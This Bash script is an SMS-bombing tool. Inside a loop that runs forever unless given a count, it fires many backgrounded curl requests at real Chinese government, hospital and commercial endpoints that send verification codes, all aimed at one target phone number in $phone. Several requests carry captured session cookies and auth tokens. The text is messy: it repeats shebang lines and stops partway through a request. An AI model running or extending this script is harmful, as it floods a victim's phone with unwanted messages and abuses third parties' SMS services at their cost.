#!/bin/bash

# 定义一个函数，参数 $1 为循环次数，如果为 null 或未提供则无限循环
execute_loop() {
    local loop_count=$1 # 用户输入的循环次数
    local i

    if [ -z "$loop_count" ] || [ "$loop_count" -eq 0 ]; then
        # 如果输入为空或0，则无限循环
        while true; do
            #!/bin/bash

#!/bin/bash
#!/bin/bash

# 第1个请求
curl -X POST "https://miniapps.nj12345.net/wechatsmallprogram/rest/checkcode/getCheckCode" \
    -H "Host: miniapps.nj12345.net" \
    -H "Connection: keep-alive" \
    -H "Content-Length: 72" \
    -H "xweb_xhr: 1" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/8555" \
    -H "Content-Type: application/json" \
    -H "Accept: */*" \
    -H "Sec-Fetch-Site: cross-site" \
    -H "Sec-Fetch-Mode: cors" \
    -H "Sec-Fetch-Dest: empty" \
    -H "Referer: https://servicewechat.com/wxed80cacf752b522a/42/page-frame.html" \
    -H "Accept-Encoding: gzip, deflate, br" \
    -H "Accept-Language: zh-CN,zh;q=0.9" \
    -d "{\"token\": \"Epoint_WebSerivce_**##0601\", \"params\": {\"mobile\": \"$phone\"}}" &
echo "第1个接口运行完毕"

# 第119个请求
curl -X POST "https://passport.xag.cn/home/sms_code" \
    -H "Host: passport.xag.cn" \
    -H "Connection: keep-alive" \
    -H "Content-Length: 24" \
    -H "mini: member" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079" \
    -H "Authorization: Basic QTFDQ0FFOUItNjcwMi0wOUY4LTVDNjUtOTM3M0ZEQkY4OTY4OjNhYzcxNjk2OGM0NzlmMmMzZTVhYjc1MjQ2OTYyMWJi" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -H "Accept: application/json" \
    -H "xweb_xhr: 1" \
    -H "X-Requested-With: XMLHttpRequest" \
    -H "token: " \
    -H "Sec-Fetch-Site: cross-site" \
    -H "Sec-Fetch-Mode: cors" \
    -H "Sec-Fetch-Dest: empty" \
    -H "Referer: https://servicewechat.com/wx43471742f3e783cb/213/page-frame.html" \
    -H "Accept-Encoding: gzip, deflate, br" \
    -H "Accept-Language: zh-CN,zh;q=0.9" \
    -d "icc=86&phone=$phone" &
echo "第119个接口运行完毕"

# 第2个请求
curl -X POST "https://www.luzhou12345.cn/app12345wbs.asmx/getInfo" \
    -H "Host: www.luzhou12345.cn" \
    -H "Connection: keep-alive" \
    -H "Content-Length: 80" \
    -H "xweb_xhr: 1" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/8555" \
    -H "Content-Type: application/json" \
    -H "Accept: */*" \
    -H "Sec-Fetch-Site: cross-site" \
    -H "Sec-Fetch-Mode: cors" \
    -H "Sec-Fetch-Dest: empty" \
    -H "Referer: https://servicewechat.com/wx218d959b2ebd15a7/13/page-frame.html" \
    -H "Accept-Encoding: gzip, deflate, br" \
    -H "Accept-Language: zh-CN,zh;q=0.9" \
    -d "{\"AcceptType\": \"sendwritevercode\", \"AcceptContent\": \"{\\\"Mobile\\\":\\\"$phone\\\"}\"}" &
echo "第2个接口运行完毕"

# 第3个请求
curl -X POST "https://12345xcx.shaanxi.gov.cn/xcxrest/rest/applets/onlineUser/getUnloginMsgCode" \
    -H "Host: 12345xcx.shaanxi.gov.cn" \
    -H "Connection: keep-alive" \
    -H "Content-Length: 100" \
    -H "Accept: text/html;charset=utf-8" \
    -H "xweb_xhr: 1" \
    -H "x-authenticated-userid: " \
    -H "Authorization: Bearer undefined" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/8555" \
    -H "Content-Type: application/json;charset=UTF-8" \
    -H "Sec-Fetch-Site: cross-site" \
    -H "Sec-Fetch-Mode: cors" \
    -H "Sec-Fetch-Dest: empty" \
    -H "Referer: https://servicewechat.com/wxd8aa257f596cdad9/44/page-frame.html" \
    -H "Accept-Encoding: gzip, deflate, br" \
    -H "Accept-Language: zh-CN,zh;q=0.9" \
    -d "{\"token\": \"Epoint_WebSerivce_**##0601\", \"params\": {\"userMobile\": \"$phone\", \"validateCodeType\": \"01\"}}" &
echo "第3个接口运行完毕"

# 第4个请求
curl -X POST "https://www.tbeatcny.cn:10015/zhwl/api/sjzj/verificationCode" \
    -H "Host: www.tbeatcny.cn:10015" \
    -H "Connection: keep-alive" \
    -H "Content-Length: 26" \
    -H "xweb_xhr: 1" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/8555" \
    -H "Content-Type: application/json" \
    -H "Accept: */*" \
    -H "Sec-Fetch-Site: cross-site" \
    -H "Sec-Fetch-Mode: cors" \
    -H "Sec-Fetch-Dest: empty" \
    -H "Referer: https://servicewechat.com/wx17286984933e6e9e/125/page-frame.html" \
    -H "Accept-Encoding: gzip, deflate, br" \
    -H "Accept-Language: zh-CN,zh;q=0.9" \
    -d "{\"username\": \"$phone\"}" &
echo "第4个接口运行完毕"

# 第5个请求
curl -X POST "https://wxpay-web.yixincapital.com/wxpay-web/minBasis/verificationCode" \
    -H "Host: wxpay-web.yixincapital.com" \
    -H "Connection: keep-alive" \
    -H "Content-Length: 71" \
    -H "xweb_xhr: 1" \
    -H "cookie: " \
    -H "yixin: 63f0a60118a1e90f4844c666465ba5b0" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/8555" \
    -H "Content-Type: application/x-www-form-urlencoded;charset=UTF-8" \
    -H "Accept: */*" \
    -H "Sec-Fetch-Site: cross-site" \
    -H "Sec-Fetch-Mode: cors" \
    -H "Sec-Fetch-Dest: empty" \
    -H "Referer: https://servicewechat.com/wxc5bea8c2c3586398/70/page-frame.html" \
    -H "Accept-Encoding: gzip, deflate, br" \
    -H "Accept-Language: zh-CN,zh;q=0.9" \
    -d "openId=IzaKfsCaIjNAhbSJ8mTaJSWPbQJDKW1IidEbQoPPIYE%3D&phone=$phone" &
echo "第5个接口运行完毕"

# 第6个请求
curl -X POST "https://qyzwfw.cn/cns-bmfw-webrest/rest/mobileUser/getCheckCode" \
    -H "Host: qyzwfw.cn" \
    -H "Connection: keep-alive" \
    -H "Content-Length: 72" \
    -H "xweb_xhr: 1" \
    -H "Authorization: Bearer fa29301a889060f25b6ccad9d2f493b3" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/8555" \
    -H "Content-Type: application/json;charest=UTF-8" \
    -H "Accept: */*" \
    -H "Sec-Fetch-Site: cross-site" \
    -H "Sec-Fetch-Mode: cors" \
    -H "Sec-Fetch-Dest: empty" \
    -H "Referer: https://servicewechat.com/wxf983f4eb853c26bc/8/page-frame.html" \
    -H "Accept-Encoding: gzip, deflate, br" \
    -H "Accept-Language: zh-CN,zh;q=0.9" \
    -d "{\"token\": \"Epoint_WebSerivce_**##0601\", \"params\": {\"mobile\": \"$phone\"}}" &
echo "第6个接口运行完毕"
#!/bin/bash

# 第7个请求
curl -X POST "https://www.12345hbsz.com/szbmfwwxrest/rest/userInfo/getVerifiCode" \
    -H "Host: www.12345hbsz.com" \
    -H "Connection: keep-alive" \
    -H "Content-Length: 77" \
    -H "Accept: text/html;charset=utf-8" \
    -H "xweb_xhr: 1" \
    -H "Authorization: Bearer" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/8555" \
    -H "Content-Type: application/json;charest=UTF-8" \
    -H "Sec-Fetch-Site: cross-site" \
    -H "Sec-Fetch-Mode: cors" \
    -H "Sec-Fetch-Dest: empty" \
    -H "Referer: https://servicewechat.com/wx08f3dbf24a512230/11/page-frame.html" \
    -H "Accept-Encoding: gzip, deflate, br" \
    -H "Accept-Language: zh-CN,zh;q=0.9" \
    -d "{\"token\": \"Epoint_WebSerivce_**##0601\", \"params\": {\"phoneNumber\": \"$phone\"}}" &
echo "第7个接口运行完毕"

# 第8个请求
curl -X POST "https://www.xysxzspj.com/index/Server/send_code.html" \
    -H "Host: www.xysxzspj.com" \
    -H "Connection: keep-alive" \
    -H "Content-Length: 17" \
    -H "xweb_xhr: 1" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/8555" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -H "Accept: */*" \
    -H "Sec-Fetch-Site: cross-site" \
    -H "Sec-Fetch-Mode: cors" \
    -H "Sec-Fetch-Dest: empty" \
    -H "Referer: https://servicewechat.com/wx401fdaf166382a62/4/page-frame.html" \
    -H "Accept-Encoding: gzip, deflate, br" \
    -H "Accept-Language: zh-CN,zh;q=0.9" \
    -d "phone=$phone" &
echo "第8个接口运行完毕"

# 第9个请求
curl -X POST "https://b.aifabu.com/v1/setSmsCode" \
    -H "Host: b.aifabu.com" \
    -H "Connection: keep-alive" \
    -H "Content-Length: 30" \
    -H "Accept: application/json, text/plain, */*" \
    -H "Origin: https://www.aifabu.com" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3947.100 Safari/537.36" \
    -H "Content-Type: application/json" \
    -H "Referer: https://www.aifabu.com/register" \
    -H "Accept-Encoding: gzip, deflate, br" \
    -H "Accept-Language: zh-CN,zh;q=0.9" \
    -d "{\"phone\": \"$phone\", \"type\": 1}" &
echo "第9个接口运行完毕"

# 第10个请求
curl -X POST "https://userapi.heaye.shop/api/auth/sendSms" \
    -H "Host: userapi.heaye.shop" \
    -H "Connection: keep-alive" \
    -H "Content-Length: 23" \
    -H "xweb_xhr: 1" \
    -H "Authorization: Bearer oHQMv5f-j93ZBVLZVN5P5f8Ehrms" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/8555" \
    -H "Content-Type: application/json;charset=UTF-8" \
    -H "Accept: */*" \
    -H "Sec-Fetch-Site: cross-site" \
    -H "Sec-Fetch-Mode: cors" \
    -H "Sec-Fetch-Dest: empty" \
    -H "Referer: https://servicewechat.com/wx38bb9a6b3ddc1d77/177/page-frame.html" \
    -H "Accept-Encoding: gzip, deflate, br" \
    -H "Accept-Language: zh-CN,zh;q=0.9" \
    -d "{\"phone\": \"$phone\"}" &
echo "第10个接口运行完毕"

# 第11个请求
curl -X POST "https://www.mytijian.com/main/action/mobileValidationCode?_site=hnszsy&_siteType=mobile&_p=&clientVersion=v1.1.6" \
    -H "Host: www.mytijian.com" \
    -H "Connection: keep-alive" \
    -H "Content-Length: 26" \
    -H "unique-submit-token: 2a87e5f9-c78a-4c50-9830-e715d9dbf134_1710752032041" \
    -H "x-mytjian-client: WECHAT_MINI_APP" \
    -H "xweb_xhr: 1" \
    -H "Cookie: SESSION=686cdb0d-abb1-461f-8349-a9d441c78948;" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/8555" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -H "Accept: */*" \
    -H "Sec-Fetch-Site: cross-site" \
    -H "Sec-Fetch-Mode: cors" \
    -H "Sec-Fetch-Dest: empty" \
    -H "Referer: https://servicewechat.com/wx650990c67b116478/31/page-frame.html" \
    -H "Accept-Encoding: gzip, deflate, br" \
    -H "Accept-Language: zh-CN,zh;q=0.9" \
    -d "scene=6&mobile=$phone" &
echo "第11个接口运行完毕"
#!/bin/bash

# 第12个请求
curl -X POST "https://health.gz12hospital.cn:6603/smartpe-busi-service/app/captcha" \
    -H "Host: health.gz12hospital.cn:6603" \
    -H "Connection: keep-alive" \
    -H "Content-Length: 47" \
    -H "xweb_xhr: 1" \
    -H "Cookie: JSESSIONID=" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/8555" \
    -H "token: " \
    -H "Content-Type: application/json" \
    -H "Accept: */*" \
    -H "Sec-Fetch-Site: cross-site" \
    -H "Sec-Fetch-Mode: cors" \
    -H "Sec-Fetch-Dest: empty" \
    -H "Referer: https://servicewechat.com/wx7ec9015f854756ec/14/page-frame.html" \
    -H "Accept-Encoding: gzip, deflate, br" \
    -H "Accept-Language: zh-CN,zh;q=0.9" \
    -d "{\"archiveCode\": \"440130\", \"mobile\": \"$phone\"}" &
echo "第12个接口运行完毕"

# 第13个请求
curl -X POST "https://a.welife001.com/applet/sendVerifyCode" \
    -H "Host: a.welife001.com" \
    -H "Connection: keep-alive" \
    -H "Content-Length: 23" \
    -H "x-rid: 3ACFBC8F-F10E-454F-80F7-E9CF80EFA70B" \
    -H "imprint: oWRkU0UWqnOnuclLWq1fDw0SHnqs" \
    -H "xweb_xhr: 1" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/8555" \
    -H "Content-Type: application/json;charset=UTF-8" \
    -H "Accept: */*" \
    -H "Sec-Fetch-Site: cross-site" \
    -H "Sec-Fetch-Mode: cors" \
    -H "Sec-Fetch-Dest: empty" \
    -H "Referer: https://servicewechat.com/wx23d8d7ea22039466/2307/page-frame.html" \
    -H "Accept-Encoding: gzip, deflate, br" \
    -H "Accept-Language: zh-CN,zh;q=0.9" \
    -d "{\"phone\": \"$phone\"}" &
echo "第13个接口运行完毕"

# 第14个请求
curl -X POST "https://mc.tengmed.com/formaltrpcapi/patient_manager/sendPhoneVerifyCode" \
    -H "Host: mc.tengmed.com" \
    -H "Connection: keep-alive" \
    -H "Content-Length: 112" \
    -H "Th-Session-Id: nszli17107510056466xqDMumPGcno4AcG2RgBl4N5IbUa27137d0-wx" \
    -H "xweb_xhr: 1" \
    -H "Th-Auth-Type: tencent-health-mini" \
    -H "Th-Appid: wxc35283883e1d86d5" \
    -H "Th-Code: " \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/8555" \
    -H "Content-Type: application/json" \
    -H "Accept: */*" \
    -H "Sec-Fetch-Site: cross-site" \
    -H "Sec-Fetch-Mode: cors" \
    -H "Sec-Fetch-Dest: empty" \
    -H "Referer: https://servicewechat.com/wxc35283883e1d86d5/240/page-frame.html" \
    -H "Accept-Encoding: gzip, deflate, br" \
    -H "Accept-Language: zh-CN,zh;q=0.9" \
    -d "{\"request\": {\"commonIn\": {\"requestId\": \"5cbc9535-fbe7-4f39-8902-37bf8ef68889\", \"channel\": \"\"}, \"phone\": \"$phone\"}}" &
echo "第14个接口运行完毕"

# 第15个请求
curl -X POST "https://ls.xzrcfw.com/App/Sys/SendPhoneCode" \
    -H "Host: ls.xzrcfw.com" \
    -H "Connection: keep-alive" \
    -H "Content-Length: 131" \
    -H "xweb_xhr: 1" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/8555" \
    -H "Content-Type: application/json" \
    -H "Accept: */*" \
    -H "Sec-Fetch-Site: cross-site" \
    -H "Sec-Fetch-Mode: cors" \
    -H "Sec-Fetch-Dest: empty" \
    -H "Referer: https://servicewechat.com/wx244d94feafd1e7f7/8/page-frame.html" \
    -H "Accept-Encoding: gzip, deflate, br" \
    -H "Accept-Language: zh-CN,zh;q=0.9" \
    -d "{\"requestModel\": {\"phone\": \"$phone\", \"OptionType\": 1, \"Role\": 2}, \"Token\": None, \"Source\": \"MiniProject\", \"Platform\": 2, \"isTibetan\": False}" &
echo "第15个接口运行完毕"

# 第16个请求
curl -X POST "https://qjpt.dypmw.com/api/xilujob.sms/send" \
    -H "Host: qjpt.dypmw.com" \
    -H "Connection: keep-alive" \
    -H "Content-Length: 24" \
    -H "xweb_xhr: 1" \
    -H "cityid: 0" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/8555" \
    -H "Content-Type: application/json" \
    -H "Accept: */*" \
    -H "Sec-Fetch-Site: cross-site" \
    -H "Sec-Fetch-Mode: cors" \
    -H "Sec-Fetch-Dest: empty" \
    -H "Referer: https://servicewechat.com/wx3a1972bbf0d8aaee/17/page-frame.html" \
    -H "Accept-Encoding: gzip, deflate, br" \
    -H "Accept-Language: zh-CN,zh;q=0.9" \
    -d "{\"mobile\": \"$phone\"}" &
echo "第16个接口运行完毕"
#!/bin/bash

# 第17个请求
curl -X POST "https://www.hnzgfwpt.cn/ums-wechat/sms/send-code" \
    -H "Host: www.hnzgfwpt.cn" \
    -H "Connection: keep-alive" \
    -H "Content-Length: 147" \
    -H "xweb_xhr: 1" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/8555" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -H "Accept: */*" \
    -H "Sec-Fetch-Site: cross-site" \
    -H "Sec-Fetch-Mode: cors" \
    -H "Sec-Fetch-Dest: empty" \
    -H "Referer: https://servicewechat.com/wx66e8d31ce1746b26/15/page-frame.html" \
    -H "Accept-Encoding: gzip, deflate, br" \
    -H "Accept-Language: zh-CN,zh;q=0.9" \
    -d "unionid=oLhND6juFSLTyPDtojyUxFrpZQuQ&mobile=$phone&msgPrefix=【河南新就业工会】" &
echo "第17个接口运行完毕"

# 第18个请求
curl -X POST "https://applets.qinyunjiuye.cn/sxzhjy_h5/tel/telmessage/save" \
    -H "Host: applets.qinyunjiuye.cn" \
    -H "Connection: keep-alive" \
    -H "Content-Length: 21" \
    -H "Accept: */*" \
    -H "X-Requested-With: XMLHttpRequest" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/8555" \
    -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" \
    -H "Origin: https://applets.qinyunjiuye.cn" \
    -H "Sec-Fetch-Site: same-origin" \
    -H "Sec-Fetch-Mode: cors" \
    -H "Sec-Fetch-Dest: empty" \
    -H "Referer: https://applets.qinyunjiuye.cn/sxzhjy_h5/common/register" \
    -H "Accept-Encoding: gzip, deflate, br" \
    -H "Accept-Language: zh-CN,zh;q=0.9" \
    -H "Cookie: sxzhjy_h5_JSESSIONID=5a1224a5-8522-4728-98a5-63e77895b46e; x_host_key=18e50dcb1bb-08f9fcecc48af8278514a5c43164c331fa74d2ce" \
    -d "telephone=$phone" &
echo "第18个接口运行完毕"

# 第19个请求
curl -X POST "https://edu.jsgpa.com/admin/apis/user/api/user/send/code" \
    -H "Host: edu.jsgpa.com" \
    -H "Connection: keep-alive" \
    -H "Content-Length: 32" \
    -H "xweb_xhr: 1" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/8555" \
    -H "Content-Type: application/json" \
    -H "Accept: */*" \
    -H "Sec-Fetch-Site: cross-site" \
    -H "Sec-Fetch-Mode: cors" \
    -H "Sec-Fetch-Dest: empty" \
    -H "Referer: https://servicewechat.com/wxf54a2e4b15af66b6/8/page-frame.html" \
    -H "Accept-Encoding: gzip, deflate, br" \
    -H "Accept-Language: zh-CN,zh;q=0.9" \
    -d "{\"phone\": \"$phone\", \"type\": 1}" &
echo "第19个接口运行完毕"

# 第20个请求
curl -X POST "https://eibp-api.ynjspx.cn/before/captcha/smsCode" \
    -H "Host: eibp-api.ynjspx.cn" \
    -H "Connection: keep-alive" \
    -H "Content-Length: 23" \
    -H "xweb_xhr: 1" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/8555" \
    -H "Content-Type: application/json" \
    -H "Accept: */*" \
    -H "Sec-Fetch-Site: cross-site" \
    -H "Sec-Fetch-Mode: cors" \
    -H "Sec-Fetch-Dest: empty" \
    -H "Referer: https://servicewechat.com/wxb489afebd817b08c/37/page-frame.html" \
    -H "Accept-Encoding: gzip, deflate, br" \
    -H "Accept-Language: zh-CN,zh;q=0.9" \
    -d "{\"phone\": \"$phone\"}" &
echo "第20个接口运行完毕"

# 第21个请求
curl -X POST "https://yuanzhijiekeji.cn/api.html" \
    -H "Host: yuanzhijiekeji.cn" \
    -H "Connection: keep-alive" \
    -H "Content-Length: 57" \
    -H "xweb_xhr: 1" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/8555" \
    -H "Content-Type: application/json" \
    -H "Accept: */*" \
    -H "Sec-Fetch-Site: cross-site" \
    -H "Sec-Fetch-Mode: cors" \
    -H "Sec-Fetch-Dest: empty" \
    -H "Referer: https://servicewechat.com/wx5f54ab339a33e547/5/page-frame.html" \
    -H "Accept-Encoding: gzip, deflate, br" \
    -H "Accept-Language: zh-CN,zh;q=0.9" \
    -d "{\"mobile\": \"$phone\", \"code\": \"reg\", \"method\": \"user.sms\"}" &
echo "第21个接口运行完毕"
#!/bin/bash

# 第22个请求
curl -X POST "https://826625173.ehpp.club/weapp/customer/getCheckNo" \
    -H "Host: 826625173.ehpp.club" \
    -H "Connection: keep-alive" \
    -H "Content-Length: 23" \
    -H "xweb_xhr: 1" \
    -H "Cookie: koa:sess=eyJza2V5IjoiZTE3Nzc0NTVmNTFhZjQ3ZmFkOThmMTYwOTE2ODVjZTY1OTc4Yzg0MiIsInVzZXJpbmZvIjp7InVpZCI6MzU2OSwib3BlbklkIjoib1dBNmE1WGJGYlVjS3VjS29xOU04R1UweXV1NCIsIm5pY2tOYW1lIjoi5b6u5L+h55So5oi3IiwiYXZhdGFyVXJsIjoiaHR0cHM6Ly90aGlyZHd4LnFsb2dvLmNuL21tb3Blbi92aV8zMi9QT2dFd2g0bUlITzRuaWJIMEtsTUVDTmpqR3hRVXEyNFpFYUdUNHBvQzZpY1JpY2NWR0tTeVh3aWJjUHE0QldtaWFJR3VHMWljd3hhUVg2Z3JDOVZlbVpvSjhyZy8xMzIiLCJyZWFsTmFtZSI6bnVsbCwiZ2VuZGVyIjowLCJwcm92aW5jZSI6IiIsImNvdW50cnkiOiIiLCJjaXR5IjoiIiwiY29tcGFueU5hbWUiOm51bGwsImNvbXBhbnlpZCI6bnVsbCwiYm9udXMiOjAsInRvdGFsX2JvbnVzIjowLCJsYXN0X3VwbG9hZF9ydW5fdGltZSI6bnVsbCwiY3JlYXRlX3RpbWUiOiIyMDI0LTAzLTIyVDA1OjE2OjA3LjAwMFoiLCJhaWQiOm51bGwsInBob25lIjoiIiwibWVtYmVyIjowLCJtZW1iZXJfdXBkYXRlIjoiMjAyNC0wMy0yMlQwNToxNjowNy4wMDBaIiwibWVtYmVyX2xldmVsIjpudWxsfSwiX2V4cGlyZSI6MTcxMTY4OTM2NzI3MiwiX21heEFnZSI6NjA0ODAwMDAwfQ==; path=/; expires=Fri, 29 Mar 2024 05:16:07 GMT; httponly" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079" \
    -H "Content-Type: application/json" \
    -H "Accept: */*" \
    -H "Sec-Fetch-Site: cross-site" \
    -H "Sec-Fetch-Mode: cors" \
    -H "Sec-Fetch-Dest: empty" \
    -H "Referer: https://servicewechat.com/wx10456ccd8ac36129/29/page-frame.html" \
    -H "Accept-Encoding: gzip, deflate, br" \
    -H "Accept-Language: zh-CN,zh;q=0.9" \
    -d "{\"phone\": \"$phone\"}" &
echo "第22个接口运行完毕"

# 第23个请求
curl -X POST "https://media.hzj7.com/index.php/App800/Login/phone_code" \
    -H "Host: media.hzj7.com" \
    -H "Connection: keep-alive" \
    -H "Content-Length: 17" \
    -H "xweb_xhr: 1" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -H "Accept: */*" \
    -H "Sec-Fetch-Site: cross-site" \
    -H "Sec-Fetch-Mode: cors" \
    -H "Sec-Fetch-Dest: empty" \
    -H "Referer: https://servicewechat.com/wx26b5da4a7499bd28/10/page-frame.html" \
    -H "Accept-Encoding: gzip, deflate, br" \
    -H "Accept-Language: zh-CN,zh;q=0.9" \
    -d "phone=$phone" &
echo "第23个接口运行完毕"

# 第26个请求
curl -X POST "https://shop.zdjt.com/api.html" \
    -H "Host: shop.zdjt.com" \
    -H "Connection: keep-alive" \
    -H "Content-Length: 58" \
    -H "Accept: application/json" \
    -H "xweb_xhr: 1" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079" \
    -H "Content-Type: application/json" \
    -H "Sec-Fetch-Site: cross-site" \
    -H "Sec-Fetch-Mode: cors" \
    -H "Sec-Fetch-Dest: empty" \
    -H "Referer: https://servicewechat.com/wx90330e7d263388a9/57/page-frame.html" \
